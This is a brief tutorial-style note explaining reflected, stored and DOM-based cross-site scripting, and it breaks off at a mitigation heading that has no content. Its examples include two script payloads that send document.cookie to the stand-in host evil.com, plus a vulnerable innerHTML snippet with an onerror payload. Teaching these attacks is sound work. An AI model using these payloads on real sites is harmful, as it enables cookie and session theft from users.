## Reflected XSS

### Keys

- The Attack is focused on the user input like crafted urls with mailicious payload.

### Example

It is very simple to add a malicious payload in a vulnerable website link.

```
http://website.com/search?keyword=<script>window.location='http://evil.com/?c='+document.cookie</script>
```

The victim will open this link and will be redirected to a malicious site with the cookie content in the URL.

Inside the malicious code we can add extra payloads like (ajax calls... )

### Keys

Also known as stored XSS. The malicious script comes from the website's database, so this attack requires few steps to succeed.

- In the first step the attacker will add a malicious payload to the server (so it will be stored).
- Later on the victims will access to the site and the malicious payload will be downloaded together with the legitimate content.

This attack can lead to Cookie theft, KeyLogging, Phishing...

### Example

The attacker adds a malicious payload in the comments section of the site.

```
POST "http://website.com/blog/post-1/comment", body{"<script>window.location='http://evil.com/?c='+document.cookie</script>}
```

Any user that visits the website will be vulnerable once this malicious comment is loaded.

## DOM XSS

### Keys

If the attacker controls any input field value, they can easily add malicious values:

```js
const search = document.getElementById('search').value
document.getElementById('results').innerHTML = `You searched for: ${search}`
```

```
You searched for: <img src=error onerror='/* Evil payload */'>
```

## The solution

There are no definitive solutions to avoid this attack but it can be highly mitigated.
